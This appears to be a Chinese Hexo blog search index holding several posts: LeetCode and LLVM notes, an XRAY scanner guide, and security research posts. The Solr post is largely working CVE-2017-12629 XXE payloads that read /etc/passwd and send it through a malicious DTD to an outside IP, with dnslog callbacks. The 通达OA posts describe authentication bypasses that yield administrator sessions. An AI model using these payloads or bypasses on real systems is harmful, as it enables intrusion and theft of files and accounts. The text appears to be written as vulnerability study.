<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>面试算法题系列</title>
    <url>/%E7%AE%97%E6%B3%95/%E9%9D%A2%E8%AF%95%E7%AE%97%E6%B3%95%E9%A2%98%E7%B3%BB%E5%88%97/</url>
    <content><![CDATA[<p>本文主要描述自己练习的算法题总结，会经常更新。</p>
<a id="more"></a>

<h2><span id="字符串">字符串</span></h2><h2><span id="数组">数组</span></h2><p><a href="https://blog.ydq6.com/算法/求数组连续最大和/">求数组连续最大和</a></p>
<p> <a href="https://blog.ydq6.com/算法/Leetcode4-寻找两个正序数组的中位数/">寻找两个正序数组的中位数</a></p>
<h2><span id="链表">链表</span></h2><p><a href="https://blog.ydq6.com/算法/Leetcode142-环形链表-II/">环形链表求环</a></p>
<h2><span id="队列和栈">队列和栈</span></h2><p><a href="https://blog.ydq6.com/算法/Leetcode146-LRU缓存机制/">设计一个LRU缓存系统</a></p>
<h2><span id="排序">排序</span></h2><h2><span id="动态规划">动态规划</span></h2>]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>LLVM-bug</title>
    <url>/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/LLVM-bug/</url>
    <content><![CDATA[<h2><span id="llvmtrap">llvm.trap</span></h2><p>今天在做项目时发现一个问题。用clang生成的.bc文件可能会生成一些陷阱指令。</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">call</span> void <span class="title">@llvm.trap</span>()</span><br><span class="line"><span class="keyword">unreachable</span></span><br></pre></td></tr></table></figure>

<p>所以在改写代码时要注意，不要在陷阱指令后加hook或其他指令，不然永远达不到而且会报错。</p>
<p>[注] 作者使用版本为llvm7.0</p>
]]></content>
      <categories>
        <category>程序分析</category>
      </categories>
      <tags>
        <tag>LLVM</tag>
      </tags>
  </entry>
  <entry>
    <title>通达OA漏洞</title>
    <url>/uncategorized/%E9%80%9A%E8%BE%BEOA%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h3><span id="任意用户登录漏洞">任意用户登录漏洞</span></h3><p>在logincheck_code.php中删除cookie并在post请求中加入UID=1，然后响应返回系统管理员session值。</p>
<p>演示：<br><img src="/assets/image-20200620113426425.png" alt="image-20200620113426425"></p>
]]></content>
  </entry>
  <entry>
    <title>Leetcode102-二叉树层次遍历</title>
    <url>/program/Leetcode102-%E4%BA%8C%E5%8F%89%E6%A0%91%E5%B1%82%E6%AC%A1%E9%81%8D%E5%8E%86/</url>
    <content><![CDATA[<h4><span id="102-二叉树的层序遍历"></span></h4><p>难度中等536</p>
<p>给你一个二叉树，请你返回其按 <strong>层序遍历</strong> 得到的节点值。 （即逐层地，从左到右访问所有节点）。</p>
<p><strong>示例：</strong><br>二叉树：<code>[3,9,20,null,null,15,7]</code>,</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">  <span class="number">3</span></span><br><span class="line"> / \</span><br><span class="line"><span class="number">9</span>  <span class="number">20</span></span><br><span class="line">  /  \</span><br><span class="line"> <span class="number">15</span>   <span class="number">7</span></span><br></pre></td></tr></table></figure>

<p>返回其层次遍历结果：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">  [<span class="number">3</span>],</span><br><span class="line">  [<span class="number">9</span>,<span class="number">20</span>],</span><br><span class="line">  [<span class="number">15</span>,<span class="number">7</span>]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>这道题思想就是利用bfs队列+单独map表示节点层次</p>
<p>java代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; levelOrder(TreeNode root) &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        HashMap&lt;TreeNode,Integer&gt; levelMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        queue.add(root);</span><br><span class="line">        List&lt;Integer&gt; integers = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        <span class="keyword">int</span> lastLevel = -<span class="number">1</span>;</span><br><span class="line">        levelMap.put(root,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            TreeNode top = queue.poll();</span><br><span class="line">            <span class="keyword">int</span> level = levelMap.get(top);</span><br><span class="line">            <span class="keyword">if</span>(level != lastLevel)&#123;</span><br><span class="line">                integers = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">                integers.add(top.val);</span><br><span class="line">                res.add(integers);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                integers.add(top.val);</span><br><span class="line">            &#125;</span><br><span class="line">            lastLevel = level;</span><br><span class="line">            <span class="keyword">if</span>(top.left != <span class="keyword">null</span>) &#123;</span><br><span class="line">                queue.add(top.left);</span><br><span class="line">                levelMap.put(top.left,level+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(top.right != <span class="keyword">null</span>)&#123;</span><br><span class="line">                queue.add(top.right);</span><br><span class="line">                levelMap.put(top.right,level+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>效率并不高：<br><img src="/assets/image-20200619194659825.png" alt="image-20200619194659825"></p>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>常用软件漏洞集合</title>
    <url>/uncategorized/%E5%B8%B8%E7%94%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/</url>
    <content><![CDATA[<h3><span id="nginx漏洞">Nginx漏洞</span></h3><h3><span id="通达oa">通达OA</span></h3><h3><span id="任意用户登录漏洞">任意用户登录漏洞</span></h3><p>在logincheck_code.php中删除cookie并在post请求中加入UID=1，然后响应返回系统管理员session值。</p>
<h3><span id="另一处任意用户登录漏洞">另一处任意用户登录漏洞</span></h3><p>通过精心构造请求得到系统管理员的codeuid,然后再在login_code_check.php的get请求中带入codeuid参数得到系统管理员的session。</p>
]]></content>
  </entry>
  <entry>
    <title>XRAY介绍</title>
    <url>/uncategorized/XRAY%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<h1><span id="扫描">扫描</span></h1><p>扫描：</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">xray webscan <span class="comment">--basic-crawler url</span></span><br></pre></td></tr></table></figure>



<p>测试：</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">.\xray_windows_386.exe webscan --basic-crawler <span class="string">http:</span><span class="comment">//testphp.vulnweb.com/</span></span><br></pre></td></tr></table></figure>





<h2><span id="被动代理">被动代理</span></h2><p>代理扮演中间人角色。</p>
<p>1.安装浏览器代理插件：SwitchyOmega插件</p>
<p>2.生成xray证书并安装证书</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">.<span class="string">\xray_windows_386.exe</span> genca <span class="comment">#生成证书</span></span><br></pre></td></tr></table></figure>

<p>然后安装证书</p>
<p>3.启动代理</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">.\<span class="selector-tag">xray_windows_386</span><span class="selector-class">.exe</span> <span class="selector-tag">webscan</span> <span class="selector-tag">--listen</span> 127<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.1</span><span class="selector-pseudo">:1111</span> <span class="selector-tag">--html-output</span> <span class="selector-tag">proxy</span><span class="selector-class">.html</span></span><br></pre></td></tr></table></figure>

<p>可以新建proxy.bat文件：</p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2><span id="配置文件">配置文件</span></h2><p>配置文件位置config.yaml（注意只有使用过一次xray才会生成配置文件）</p>
<h3><span id="允许扫描的域">允许扫描的域</span></h3><p>配置允许扫描和不允许扫描的域：</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">includes</span></span><br><span class="line"><span class="attribute">excludes</span></span><br></pre></td></tr></table></figure>



<h3><span id="认证信息配置">认证信息配置</span></h3><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">auth</span></span><br></pre></td></tr></table></figure>





<h3><span id="扫描插件配置">扫描插件配置</span></h3><figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line">plugins中把需要开启的选项设置enabled为<span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>或者使用 –plugins pulgin1,plugin2,…</p>
<h3><span id="发包速率限制">发包速率限制</span></h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">max_qps</span>              每秒最大请求次</span><br></pre></td></tr></table></figure>



<h3><span id="扫描代理配置">扫描代理配置</span></h3><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">proxy</span></span><br></pre></td></tr></table></figure>

<p>可以配置上游代理，比如流量分发。</p>
<p>burpsuite和xray可以互相转发。</p>
<h2><span id="编写自定义poc">编写自定义POC</span></h2><p>poc为yaml格式。</p>
<p>可以使用多个规则来串联。</p>
<p>poc的构成：</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="bullet">- </span>name</span><br><span class="line"><span class="bullet">- </span>rules</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>detail:</span><br></pre></td></tr></table></figure>





]]></content>
  </entry>
  <entry>
    <title>solr漏洞研究</title>
    <url>/uncategorized/solr%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</url>
    <content><![CDATA[<p>本文主要研究solr漏洞</p>
<h1><span id="apache-solr-xml-实体注入漏洞cve-2017-12629">Apache solr XML 实体注入漏洞（CVE-2017-12629）</span></h1><p>访问存在搭建好的漏洞网站：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">121.199</span>.<span class="number">53.175</span>:<span class="number">8983</span><span class="regexp">/solr/</span>demo<span class="regexp">/select</span></span><br></pre></td></tr></table></figure>

<p>抓包：</p>
<p><img src="/assets/image-20200611095414239.png" alt="image-20200611095414239"></p>
<p>构造payload(利用dnslog):</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">/solr/demo/select?q=<span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://123.8pby62.ceye.io/"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>/&gt;</span>&amp;wt=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure>

<p>payload编码后：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">/solr/demo/<span class="keyword">select</span>?q=<span class="symbol">%3</span>C<span class="symbol">%3</span>Fxml<span class="symbol">%20</span>version<span class="symbol">%3</span>D<span class="symbol">%221</span>.<span class="number">0</span><span class="symbol">%22</span><span class="symbol">%20</span>encoding<span class="symbol">%3</span>D<span class="symbol">%22</span>UTF<span class="number">-8</span><span class="symbol">%22</span><span class="symbol">%3</span>F<span class="symbol">%3</span>E<span class="symbol">%0</span>A<span class="symbol">%3</span>C<span class="title">!DOCTYPE</span><span class="symbol">%20</span>root<span class="symbol">%20</span><span class="symbol">%5</span>B<span class="symbol">%0</span>A<span class="symbol">%3</span>C<span class="title">!ENTITY</span><span class="symbol">%20</span><span class="symbol">%25</span><span class="symbol">%20</span>remote<span class="symbol">%20</span>SYSTEM<span class="symbol">%20</span><span class="symbol">%22</span>http<span class="symbol">%3</span>A<span class="symbol">%2</span>F<span class="symbol">%2</span>F<span class="number">123.8</span>pby<span class="number">62</span>.ceye.io<span class="symbol">%2</span>F<span class="symbol">%22</span><span class="symbol">%3</span>E<span class="symbol">%0</span>A<span class="symbol">%25</span>remote<span class="symbol">%3</span>B<span class="symbol">%5</span>D<span class="symbol">%3</span>E<span class="symbol">%0</span>A<span class="symbol">%3</span>Croot<span class="symbol">%2</span>F<span class="symbol">%3</span>E&amp;wt=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure>



<p>成功显示：</p>
<p><img src="/assets/image-20200611175358522.png" alt="image-20200611175358522"></p>
<p>尝试读文件：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">/solr/demo/<span class="keyword">select</span>?q=<span class="symbol">%3</span>C<span class="symbol">%3</span>Fxml<span class="symbol">%20</span>version<span class="symbol">%3</span>D<span class="symbol">%221</span>.<span class="number">0</span><span class="symbol">%22</span><span class="symbol">%20</span>encoding<span class="symbol">%3</span>D<span class="symbol">%22</span>UTF<span class="number">-8</span><span class="symbol">%22</span><span class="symbol">%3</span>F<span class="symbol">%3</span>E<span class="symbol">%0</span>A<span class="symbol">%3</span>C<span class="title">!DOCTYPE</span><span class="symbol">%20</span>root<span class="symbol">%20</span><span class="symbol">%5</span>B<span class="symbol">%0</span>A<span class="symbol">%3</span>C<span class="title">!ENTITY</span><span class="symbol">%20</span><span class="symbol">%25</span><span class="symbol">%20</span>remote<span class="symbol">%20</span>SYSTEM<span class="symbol">%20</span><span class="symbol">%22</span>file<span class="symbol">%3</span>A<span class="symbol">%2</span>F<span class="symbol">%2</span>F<span class="symbol">%2</span>Fetc<span class="symbol">%2</span>Fpasswd<span class="symbol">%22</span><span class="symbol">%3</span>E<span class="symbol">%0</span>A<span class="symbol">%25</span>remote<span class="symbol">%3</span>B<span class="symbol">%5</span>D<span class="symbol">%3</span>E<span class="symbol">%0</span>A<span class="symbol">%3</span>Croot<span class="symbol">%2</span>F<span class="symbol">%3</span>E&amp;wt=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200611180009274.png" alt="image-20200611180009274"></p>
<p>发现是无回显的XXE。</p>
<p>可以使用恶意DTD外带敏感文件。</p>
<p>恶意DTD:</p>
<figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://104.243.21.153:8998/%file;'&gt;"</span>&gt;</span></span></span><br><span class="line"><span class="perl">%all;</span></span><br></pre></td></tr></table></figure>

<p>攻击payload:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">/solr/demo/select?q=<span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://104.243.21.153/xxe/evil5.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%send;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>/&gt;</span>&amp;wt=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure>

<p>urlencode后：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">/solr/demo/select?q=%<span class="number">3</span>C%<span class="number">3</span>Fxml%<span class="number">20</span>version%<span class="number">3</span>D%<span class="number">221.0</span>%<span class="number">22</span>%<span class="number">20</span>encoding%<span class="number">3</span>D%<span class="number">22</span>UTF<span class="number">-8</span>%<span class="number">22</span>%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">3</span>C!DOCTYPE%<span class="number">20</span>root%<span class="number">20</span>%<span class="number">5</span>B%<span class="number">0</span>A%<span class="number">3</span>C!ENTITY%<span class="number">20</span>%<span class="number">25</span>%<span class="number">20</span>remote%<span class="number">20</span>SYSTEM%<span class="number">20</span>%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F104<span class="number">.243</span><span class="number">.21</span><span class="number">.153</span>%<span class="number">2</span>Fxxe%<span class="number">2</span>Fevil5.dtd%<span class="number">22</span>%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">25</span>remote%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">25</span>send%<span class="number">3</span>B%<span class="number">5</span>D%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">3</span>Croot%<span class="number">2</span>F%<span class="number">3</span>E&amp;wt=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure>



<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">/solr/demo/select?q=<span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://104.243.21.153/xxe/evil5.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%send;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;root;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span>&amp;wt=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure>



<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">/solr/demo/select?q=%<span class="number">3</span>C%<span class="number">3</span>Fxml%<span class="number">20</span>version%<span class="number">3</span>D%<span class="number">221.0</span>%<span class="number">22</span>%<span class="number">20</span>encoding%<span class="number">3</span>D%<span class="number">22</span>UTF<span class="number">-8</span>%<span class="number">22</span>%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">3</span>C!DOCTYPE%<span class="number">20</span>root%<span class="number">20</span>%<span class="number">5</span>B%<span class="number">0</span>A%<span class="number">3</span>C!ENTITY%<span class="number">20</span>%<span class="number">25</span>%<span class="number">20</span>remote%<span class="number">20</span>SYSTEM%<span class="number">20</span>%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F104<span class="number">.243</span><span class="number">.21</span><span class="number">.153</span>%<span class="number">2</span>Fxxe%<span class="number">2</span>Fevil5.dtd%<span class="number">22</span>%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">25</span>remote%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">25</span>send%<span class="number">3</span>B%<span class="number">5</span>D%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">3</span>Cuser%<span class="number">3</span>E%<span class="number">26</span>root%<span class="number">3</span>B%<span class="number">3</span>C%<span class="number">2</span>Fuser%<span class="number">3</span>E&amp;wt=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure>



]]></content>
  </entry>
  <entry>
    <title>LLVM系列-多态测试</title>
    <url>/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/LLVM%E7%B3%BB%E5%88%97-%E5%A4%9A%E6%80%81%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<p>此文主要探讨LLVM是如何处理多态的。</p>
<a id="more"></a>



<p>测试代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by ydq on 6/8/20.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> a+b+c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  A a;</span><br><span class="line">  <span class="keyword">int</span> res1 = a.add(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">  <span class="keyword">int</span> res2 = a.add(<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">  <span class="built_in">cout</span>&lt;&lt;<span class="string">"res1:"</span>&lt;&lt;res1&lt;&lt;<span class="string">",res2:"</span>&lt;&lt;res2&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>llvm生成：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">clang -emit-llvm testclass.cpp -S -o testclass.ll</span><br></pre></td></tr></table></figure>

<p>生成代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">; ModuleID &#x3D; &#39;testclass.cpp&#39;</span><br><span class="line">source_filename &#x3D; &quot;testclass.cpp&quot;</span><br><span class="line">target datalayout &#x3D; &quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple &#x3D; &quot;x86_64-unknown-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">%&quot;class.std::ios_base::Init&quot; &#x3D; type &#123; i8 &#125;</span><br><span class="line">%&quot;class.std::basic_ostream&quot; &#x3D; type &#123; i32 (...)**, %&quot;class.std::basic_ios&quot; &#125;</span><br><span class="line">%&quot;class.std::basic_ios&quot; &#x3D; type &#123; %&quot;class.std::ios_base&quot;, %&quot;class.std::basic_ostream&quot;*, i8, i8, %&quot;class.std::basic_streambuf&quot;*, %&quot;class.std::ctype&quot;*, %&quot;class.std::num_put&quot;*, %&quot;class.std::num_get&quot;* &#125;</span><br><span class="line">%&quot;class.std::ios_base&quot; &#x3D; type &#123; i32 (...)**, i64, i64, i32, i32, i32, %&quot;struct.std::ios_base::_Callback_list&quot;*, %&quot;struct.std::ios_base::_Words&quot;, [8 x %&quot;struct.std::ios_base::_Words&quot;], i32, %&quot;struct.std::ios_base::_Words&quot;*, %&quot;class.std::locale&quot; &#125;</span><br><span class="line">%&quot;struct.std::ios_base::_Callback_list&quot; &#x3D; type &#123; %&quot;struct.std::ios_base::_Callback_list&quot;*, void (i32, %&quot;class.std::ios_base&quot;*, i32)*, i32, i32 &#125;</span><br><span class="line">%&quot;struct.std::ios_base::_Words&quot; &#x3D; type &#123; i8*, i64 &#125;</span><br><span class="line">%&quot;class.std::locale&quot; &#x3D; type &#123; %&quot;class.std::locale::_Impl&quot;* &#125;</span><br><span class="line">%&quot;class.std::locale::_Impl&quot; &#x3D; type &#123; i32, %&quot;class.std::locale::facet&quot;**, i64, %&quot;class.std::locale::facet&quot;**, i8** &#125;</span><br><span class="line">%&quot;class.std::locale::facet&quot; &#x3D; type &lt;&#123; i32 (...)**, i32, [4 x i8] &#125;&gt;</span><br><span class="line">%&quot;class.std::basic_streambuf&quot; &#x3D; type &#123; i32 (...)**, i8*, i8*, i8*, i8*, i8*, i8*, %&quot;class.std::locale&quot; &#125;</span><br><span class="line">%&quot;class.std::ctype&quot; &#x3D; type &lt;&#123; %&quot;class.std::locale::facet.base&quot;, [4 x i8], %struct.__locale_struct*, i8, [7 x i8], i32*, i32*, i16*, i8, [256 x i8], [256 x i8], i8, [6 x i8] &#125;&gt;</span><br><span class="line">%&quot;class.std::locale::facet.base&quot; &#x3D; type &lt;&#123; i32 (...)**, i32 &#125;&gt;</span><br><span class="line">%struct.__locale_struct &#x3D; type &#123; [13 x %struct.__locale_data*], i16*, i32*, i32*, [13 x i8*] &#125;</span><br><span class="line">%struct.__locale_data &#x3D; type opaque</span><br><span class="line">%&quot;class.std::num_put&quot; &#x3D; type &#123; %&quot;class.std::locale::facet.base&quot;, [4 x i8] &#125;</span><br><span class="line">%&quot;class.std::num_get&quot; &#x3D; type &#123; %&quot;class.std::locale::facet.base&quot;, [4 x i8] &#125;</span><br><span class="line">%class.A &#x3D; type &#123; i8 &#125;</span><br><span class="line"></span><br><span class="line">$_ZN1A3addEii &#x3D; comdat any</span><br><span class="line"></span><br><span class="line">$_ZN1A3addEiii &#x3D; comdat any</span><br><span class="line"></span><br><span class="line">@_ZStL8__ioinit &#x3D; internal global %&quot;class.std::ios_base::Init&quot; zeroinitializer, align 1</span><br><span class="line">@__dso_handle &#x3D; external hidden global i8</span><br><span class="line">@_ZSt4cout &#x3D; external dso_local global %&quot;class.std::basic_ostream&quot;, align 8</span><br><span class="line">@.str &#x3D; private unnamed_addr constant [6 x i8] c&quot;res1:\00&quot;, align 1</span><br><span class="line">@.str.1 &#x3D; private unnamed_addr constant [7 x i8] c&quot;,res2:\00&quot;, align 1</span><br><span class="line">@.str.2 &#x3D; private unnamed_addr constant [2 x i8] c&quot;\0A\00&quot;, align 1</span><br><span class="line">@llvm.global_ctors &#x3D; appending global [1 x &#123; i32, void ()*, i8* &#125;] [&#123; i32, void ()*, i8* &#125; &#123; i32 65535, void ()* @_GLOBAL__sub_I_testclass.cpp, i8* null &#125;]</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline uwtable</span><br><span class="line">define internal void @__cxx_global_var_init() #0 section &quot;.text.startup&quot; &#123;</span><br><span class="line">entry:</span><br><span class="line">  call void @_ZNSt8ios_base4InitC1Ev(%&quot;class.std::ios_base::Init&quot;* @_ZStL8__ioinit)</span><br><span class="line">  %0 &#x3D; call i32 @__cxa_atexit(void (i8*)* bitcast (void (%&quot;class.std::ios_base::Init&quot;*)* @_ZNSt8ios_base4InitD1Ev to void (i8*)*), i8* getelementptr inbounds (%&quot;class.std::ios_base::Init&quot;, %&quot;class.std::ios_base::Init&quot;* @_ZStL8__ioinit, i32 0, i32 0), i8* @__dso_handle) #3</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare dso_local void @_ZNSt8ios_base4InitC1Ev(%&quot;class.std::ios_base::Init&quot;*) unnamed_addr #1</span><br><span class="line"></span><br><span class="line">; Function Attrs: nounwind</span><br><span class="line">declare dso_local void @_ZNSt8ios_base4InitD1Ev(%&quot;class.std::ios_base::Init&quot;*) unnamed_addr #2</span><br><span class="line"></span><br><span class="line">; Function Attrs: nounwind</span><br><span class="line">declare dso_local i32 @__cxa_atexit(void (i8*)*, i8*, i8*) #3</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline norecurse optnone uwtable</span><br><span class="line">define dso_local i32 @main() #4 &#123;</span><br><span class="line">entry:</span><br><span class="line">  %a &#x3D; alloca %class.A, align 1</span><br><span class="line">  %res1 &#x3D; alloca i32, align 4</span><br><span class="line">  %res2 &#x3D; alloca i32, align 4</span><br><span class="line">  %call &#x3D; call i32 @_ZN1A3addEii(%class.A* %a, i32 1, i32 2)</span><br><span class="line">  store i32 %call, i32* %res1, align 4</span><br><span class="line">  %call1 &#x3D; call i32 @_ZN1A3addEiii(%class.A* %a, i32 1, i32 3, i32 4)</span><br><span class="line">  store i32 %call1, i32* %res2, align 4</span><br><span class="line">  %call2 &#x3D; call dereferenceable(272) %&quot;class.std::basic_ostream&quot;* @_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(%&quot;class.std::basic_ostream&quot;* dereferenceable(272) @_ZSt4cout, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i32 0, i32 0))</span><br><span class="line">  %0 &#x3D; load i32, i32* %res1, align 4</span><br><span class="line">  %call3 &#x3D; call dereferenceable(272) %&quot;class.std::basic_ostream&quot;* @_ZNSolsEi(%&quot;class.std::basic_ostream&quot;* %call2, i32 %0)</span><br><span class="line">  %call4 &#x3D; call dereferenceable(272) %&quot;class.std::basic_ostream&quot;* @_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(%&quot;class.std::basic_ostream&quot;* dereferenceable(272) %call3, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i32 0, i32 0))</span><br><span class="line">  %1 &#x3D; load i32, i32* %res2, align 4</span><br><span class="line">  %call5 &#x3D; call dereferenceable(272) %&quot;class.std::basic_ostream&quot;* @_ZNSolsEi(%&quot;class.std::basic_ostream&quot;* %call4, i32 %1)</span><br><span class="line">  %call6 &#x3D; call dereferenceable(272) %&quot;class.std::basic_ostream&quot;* @_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(%&quot;class.std::basic_ostream&quot;* dereferenceable(272) %call5, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))</span><br><span class="line">  ret i32 